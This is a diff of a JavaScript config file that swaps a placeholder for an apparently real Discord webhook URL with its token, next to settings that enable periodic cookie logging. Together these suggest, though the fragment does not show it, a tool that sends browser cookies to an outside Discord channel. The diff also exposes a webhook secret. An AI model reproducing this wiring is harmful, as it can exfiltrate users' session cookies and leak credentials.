@@ -12,7 +12,7 @@ const config = {
   // Discord webhook configuration
   discordWebhook: {
     enabled: true,
-    url: "YOUR_DISCORD_WEBHOOK_URL_HERE", // Replace with your actual webhook URL
+    url: "https://discord.com/api/webhooks/1425598331186450617/aZ1GNPgxuY61sidoAJTYYU78qbaMqM-Gv6auQX7XYHJ8c0ueRq1aFeuBV7s8b6DyOZyr", // Replace with your actual webhook URL
     maxMessageLength: 2000, // Discord message limit
     cookieLogEnabled: true,
     cookieLogInterval: 300000, // 5 minutes in milliseconds
